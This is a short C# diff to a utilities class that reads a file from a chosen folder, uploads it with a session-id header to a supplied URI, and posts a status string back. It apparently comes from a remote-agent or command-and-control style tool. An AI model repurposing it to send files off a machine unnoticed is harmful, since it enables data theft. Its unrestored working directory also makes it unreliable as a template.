@@ -20,9 +20,14 @@ class Utilities
     }
 
     // File to byte[]
-    public static byte[] FileToByte(string location, string filename)
+    private static byte[] FileToByte(string location, string filename)
     {
-        string filepath = String.Concat(location, Path.DirectorySeparatorChar, filename);
+        string initial = Directory.GetCurrentDirectory();
+        Directory.SetCurrentDirectory(location);
+        if (File.Exists(filename))
+        {
+            return File.ReadAllBytes(filename);
+        }
         return new byte[0];
     }
 
@@ -84,14 +89,25 @@ class Utilities
     }
 
     // HTTP Put Request
-    public static string Put(string uri, byte[] data, string sessionid, string method = "PUT")
+    public static void Put(string uri, string filename, string location, string sessionid, string method = "PUT")
     {
-        using(var client = new System.Net.WebClient())
+        string output = "";
+        byte[] content = FileToByte(location, filename);
+        if (content.Length == 0)
         {
-            client.Headers.Add("Session-Id", sessionid);
-            client.UploadData(uri, method, data);
+            output = "#!#File is empty or does not exist";
         }
-        return "File uploaded";
+        else
+        {
+            using (var client = new WebClient())
+            {
+                client.Headers.Add("Session-Id", sessionid);
+                client.UploadData(uri, method, content);
+                output = "-- Success --";
+            }
+        }
+        
+        Post(uri, output);
     }
 
 }
